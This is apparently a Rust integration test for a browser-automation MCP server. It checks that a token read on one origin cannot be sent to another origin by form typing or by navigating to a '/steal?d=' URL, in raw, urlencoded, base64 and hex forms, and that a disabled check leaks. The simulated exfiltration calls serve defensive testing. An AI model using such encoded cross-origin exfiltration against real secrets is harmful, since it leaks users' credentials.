//! W4.D2 gate: value-flow taint. A secret read on origin A (SECRET) may not be typed into a form that
//! posts to origin B, nor put in a navigation URL to B, as itself or as its urlencoded / base64 / hex
//! copy; the same value toward A is allowed; harmless text to B is allowed. The check is exercised with
//! NO grants (the headless default). `MANUK_TAINT_MUTATE=1` disables it and the fixture must go red.

use std::io::{BufRead, BufReader, Read, Write};
use std::net::TcpListener;
use std::process::{Child, ChildStdin, ChildStdout, Command, Stdio};
use std::sync::{Arc, Mutex};

use base64::Engine;
use serde_json::{json, Value};

const SECRET: &str = "tok_9f8e7d6c5b4a";

type Log = Arc<Mutex<Vec<String>>>;

/// Serves `page` for every path; logs "METHOD path".
fn serve(page: String) -> (String, Log) {
    let log: Log = Arc::default();
    let l = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = l.local_addr().unwrap();
    let lg = log.clone();
    std::thread::spawn(move || {
        for s in l.incoming() {
            let Ok(mut s) = s else { continue };
            let (lg, page) = (lg.clone(), page.clone());
            std::thread::spawn(move || {
                let mut buf = [0u8; 8192];
                let n = s.read(&mut buf).unwrap_or(0);
                let first = String::from_utf8_lossy(&buf[..n])
                    .lines()
                    .next()
                    .unwrap_or("")
                    .to_string();
                if !first.contains("favicon") && !first.is_empty() {
                    lg.lock().unwrap().push(first);
                }
                let page = page.replace("ORIGIN", &format!("http://{}", s.local_addr().unwrap()));
                let _ = write!(s, "HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{page}", page.len());
            });
        }
    });
    (format!("http://{addr}"), log)
}

struct Client {
    child: Child,
    tx: ChildStdin,
    rx: BufReader<ChildStdout>,
    id: u64,
}

impl Client {
    fn start(chrome: bool, flags: &[String]) -> Client {
        let mut cmd = Command::new(env!("CARGO_BIN_EXE_manuk-mcp"));
        cmd.args(flags);
        if chrome {
            cmd.args(["--backend", "chrome"]);
        }
        cmd.env(
            "MANUK_ACTLOG_DIR",
            std::env::temp_dir().join(format!("w39-log-{}-{chrome}", std::process::id())),
        );
        cmd.arg("--allow-write").arg(std::env::temp_dir());
        let mut child = cmd
            .stdin(Stdio::piped())
            .stdout(Stdio::piped())
            .stderr(Stdio::null())
            .spawn()
            .expect("spawn manuk-mcp");
        let tx = child.stdin.take().unwrap();
        let rx = BufReader::new(child.stdout.take().unwrap());
        let mut c = Client {
            child,
            tx,
            rx,
            id: 0,
        };
        c.rpc("initialize", json!({"protocolVersion": "2025-03-26", "capabilities": {}, "clientInfo": {"name": "t", "version": "0"}}));
        c.send(json!({"jsonrpc": "2.0", "method": "notifications/initialized"}));
        c
    }
    fn send(&mut self, v: Value) {
        writeln!(self.tx, "{v}").unwrap();
        self.tx.flush().unwrap();
    }
    fn rpc(&mut self, method: &str, params: Value) -> Value {
        self.id += 1;
        let id = self.id;
        self.send(json!({"jsonrpc": "2.0", "id": id, "method": method, "params": params}));
        loop {
            let mut line = String::new();
            assert!(
                self.rx.read_line(&mut line).unwrap() > 0,
                "server closed stdout"
            );
            let v: Value = serde_json::from_str(&line).unwrap();
            if v["id"] == json!(id) {
                return v;
            }
        }
    }
    fn call(&mut self, name: &str, args: Value) -> (bool, String) {
        let r = self.rpc("tools/call", json!({"name": name, "arguments": args}));
        let res = &r["result"];
        let blocks = res["content"].as_array().cloned().unwrap_or_default();
        (
            res["isError"].as_bool().unwrap_or(false),
            blocks
                .iter()
                .filter_map(|b| b["text"].as_str())
                .collect::<Vec<_>>()
                .join("\n"),
        )
    }
    fn ok(&mut self, name: &str, args: Value) -> String {
        let (e, t) = self.call(name, args);
        assert!(!e, "{name} failed: {t}");
        t
    }
    fn refused(&mut self, name: &str, args: Value, needle: &str) {
        let (e, t) = self.call(name, args);
        assert!(
            e && t.contains(needle),
            "{name}: expected an error containing {needle:?}, got error={e}: {t}"
        );
    }
}
impl Drop for Client {
    fn drop(&mut self) {
        let _ = self.child.kill();
    }
}

fn handle_of(text: &str, needle: &str) -> String {
    let line = text
        .lines()
        .find(|l| l.contains(needle))
        .unwrap_or_else(|| panic!("no {needle:?} in:\n{text}"));
    let s = line.find("[h").unwrap();
    let e = line[s..].find(']').unwrap() + s;
    line[s + 1..e].to_string()
}

fn run(mutate: bool) -> (usize, usize, usize) {
    let (b, b_log) = serve("<html><body><h1>B side</h1></body></html>".into());
    let a_page = format!(
        r#"<!doctype html><html><head><title>A</title></head><body><h1>Account</h1>
<p>Your API token: {SECRET}</p>
<form method="post" action="{b}/collect"><label>Note <input name="n" aria-label="to-b"></label><button type="button">Send B</button></form>
<form method="post" action="ORIGIN/save"><label>Memo <input name="m" aria-label="to-a"></label><button type="button">Save A</button></form>
</body></html>"#
    );
    let (a, _a_log) = serve(a_page);
    let mut c = Client::start(false, &[]);
    if mutate {
        // restart with the mutation env set
        drop(c);
        std::env::set_var("MANUK_TAINT_MUTATE", "1");
        c = Client::start(false, &[]);
        std::env::remove_var("MANUK_TAINT_MUTATE");
    }
    let _ = c.ok("navigate", json!({"url": format!("{a}/")}));
    let ext = c.ok("extract", json!({}));
    assert!(
        ext.contains(SECRET),
        "fixture: secret not extracted:\n{ext}"
    );
    let b64 = base64::engine::general_purpose::STANDARD.encode(SECRET);
    let hex: String = SECRET.bytes().map(|x| format!("{x:02x}")).collect();
    let enc = [
        ("raw", SECRET.to_string()),
        ("urlencoded", SECRET.replace('_', "%5F")),
        ("base64", b64),
        ("hex", hex),
    ];
    // Back on A with fresh handles: read the secret, then list the form fields.
    let fresh = |c: &mut Client| {
        let _ = c.ok("navigate", json!({"url": format!("{a}/")}));
        let _ = c.ok("extract", json!({}));
        let obs = c.ok("observe", json!({}));
        (handle_of(&obs, "to-a"), handle_of(&obs, "to-b"))
    };
    let mut blocked = 0;
    for (name, v) in &enc {
        let (_, to_b) = fresh(&mut c);
        let (err, txt) = c.call("type", json!({"handle": to_b, "text": v}));
        eprintln!(
            "D2 type->B {name}: err={err} {}",
            txt.lines().next().unwrap_or("")
        );
        blocked += usize::from(err && txt.contains("EGRESS-DENIED"));
        fresh(&mut c);
        let (err, txt) = c.call("navigate", json!({"url": format!("{b}/steal?d={v}")}));
        eprintln!(
            "D2 nav->B {name}: err={err} {}",
            txt.lines().next().unwrap_or("")
        );
        blocked += usize::from(err && txt.contains("EGRESS-DENIED"));
    }
    let (to_a, _) = fresh(&mut c);
    let (err, txt) = c.call("type", json!({"handle": to_a, "text": SECRET}));
    let allowed_a = usize::from(!err);
    eprintln!("D2 type->A: err={err} {}", txt.lines().next().unwrap_or(""));
    let (_, to_b) = fresh(&mut c);
    let (err, _) = c.call("type", json!({"handle": to_b, "text": "hello there"}));
    let allowed_hello = usize::from(!err);
    let leaked = b_log
        .lock()
        .unwrap()
        .iter()
        .filter(|l| l.contains("/steal"))
        .count();
    eprintln!("D2 blocked={blocked}/8 allowed_a={allowed_a} allowed_hello={allowed_hello} b_steal_requests={leaked}");
    (blocked, allowed_a + allowed_hello, leaked)
}

#[test]
fn secret_read_on_a_cannot_reach_b_in_four_encodings() {
    let (blocked, allowed, leaked) = run(false);
    assert_eq!(
        blocked, 8,
        "type+navigate x 4 encodings must all be refused"
    );
    assert_eq!(
        allowed, 2,
        "same-origin and harmless sends must stay allowed"
    );
    assert_eq!(leaked, 0, "no /steal request may reach B");
}

#[test]
fn mutant_without_the_check_goes_red() {
    let (blocked, _, leaked) = run(true);
    assert!(
        blocked < 8 && leaked > 0,
        "mutant stayed green: blocked={blocked} leaked={leaked}"
    );
}
